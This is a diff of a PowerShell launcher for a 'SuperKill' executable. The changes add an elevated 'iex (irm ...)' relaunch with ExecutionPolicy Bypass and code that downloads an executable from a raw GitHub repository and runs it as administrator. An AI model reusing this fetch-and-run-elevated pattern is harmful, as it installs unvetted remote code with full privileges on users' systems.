@@ -1,83 +1,54 @@
-# SuperKill launcher (same as SUPERKILL.ps1)
-# Run: powershell -NoProfile -ExecutionPolicy Bypass -File .\SuperKill.ps1
+param(
+    [string]$u = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/SuperKill.exe',
+    [string]$p = '',
+    [string]$s = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/SuperKill.ps1'
+)
 
-$ErrorActionPreference = 'Continue'
+$ErrorActionPreference = 'Stop'
 $ProgressPreference = 'SilentlyContinue'
 
+$exeName = 'SuperKill.exe'
+$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
+$localExe = Join-Path $scriptDir $exeName
+
 function Test-IsAdmin {
-    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
-    $p = New-Object Security.Principal.WindowsPrincipal($id)
-    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-function Get-ScriptFolder {
-    if ($PSScriptRoot) { return $PSScriptRoot }
-    if ($MyInvocation.MyCommand.Path) { return (Split-Path -Parent $MyInvocation.MyCommand.Path) }
-    return $PWD.Path
+if (-not (Test-IsAdmin) -and -not (Test-Path -LiteralPath $localExe)) {
+    $ue = $u.Replace("'", "''"); $pe = $p.Replace("'", "''"); $se = $s.Replace("'", "''")
+    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"`$u='$ue'; `$p='$pe'; iex (irm '$se')`""
+    exit
 }
 
-function Find-LocalExe {
-    param([string[]]$Folders)
-
-    $names = @('SuperKill.exe', 'SUPERKILL.exe', 'superkill.exe')
-    foreach ($folder in $Folders) {
-        if (-not $folder) { continue }
-        foreach ($name in $names) {
-            $candidate = Join-Path $folder $name
-            if (Test-Path -LiteralPath $candidate) {
-                return (Resolve-Path -LiteralPath $candidate).Path
-            }
-        }
-        try {
-            $hit = Get-ChildItem -LiteralPath $folder -Filter '*.exe' -File -ErrorAction Stop |
-                Where-Object { $_.Name -match 'superkill' } |
-                Select-Object -First 1
-            if ($hit) { return $hit.FullName }
-        } catch {}
+if (Test-Path -LiteralPath $localExe) {
+    if (-not (Test-IsAdmin)) {
+        Start-Process -FilePath $localExe -Verb RunAs -WorkingDirectory $scriptDir
+    } else {
+        Get-Process SuperKill -EA 0 | Stop-Process -Force -EA 0
+        Start-Process -FilePath $localExe -WorkingDirectory $scriptDir
     }
-    return $null
+    Write-Host 'OK'
+    exit
 }
 
-function Stop-OldInstance {
-    Get-Process -Name 'SuperKill' -ErrorAction SilentlyContinue | ForEach-Object {
-        try { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue } catch {}
-    }
+$t = if ($p -and (Test-Path $p)) { $p }
+     elseif ($p) { (New-Item -ItemType Directory -Force -Path $p).FullName }
+     else { (New-Item -ItemType Directory -Force -Path (Join-Path $env:LOCALAPPDATA 'SuperKill')).FullName }
+
+$target = Join-Path $t $exeName
+Get-Process SuperKill -EA 0 | Stop-Process -Force -EA 0
+
+$f = Join-Path $env:TEMP ('sk_' + [guid]::NewGuid().ToString('N') + '.tmp')
+Invoke-WebRequest $u -OutFile $f -UseBasicParsing
+Copy-Item $f $target -Force
+Remove-Item $f -Force -EA 0
+
+if (-not (Test-IsAdmin)) {
+    Start-Process -FilePath $target -Verb RunAs -WorkingDirectory $t
+} else {
+    Start-Process -FilePath $target -WorkingDirectory $t
 }
 
-function Start-SuperKillApp {
-    param(
-        [string]$ExePath,
-        [string]$WorkDir
-    )
-
-    if (-not (Test-Path -LiteralPath $ExePath)) {
-        Write-Host "ERROR: not found -> $ExePath" -ForegroundColor Red
-        exit 1
-    }
-
-    Stop-OldInstance
-
-    try {
-        if (-not (Test-IsAdmin)) {
-            Start-Process -FilePath $ExePath -WorkingDirectory $WorkDir -Verb RunAs | Out-Null
-        } else {
-            Start-Process -FilePath $ExePath -WorkingDirectory $WorkDir | Out-Null
-        }
-        Write-Host 'OK' -ForegroundColor Green
-    } catch {
-        Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
-        exit 1
-    }
-}
-
-$scriptDir = Get-ScriptFolder
-$localExe = Find-LocalExe @($scriptDir, $PWD.Path, (Join-Path $scriptDir 'bin'))
-
-if ($localExe) {
-    Start-SuperKillApp -ExePath $localExe -WorkDir (Split-Path -Parent $localExe)
-    exit 0
-}
-
-Write-Host 'ERROR: SuperKill.exe not found next to this script.' -ForegroundColor Red
-Write-Host "Put SuperKill.exe in: $scriptDir" -ForegroundColor Yellow
-exit 1
+Write-Host 'OK'
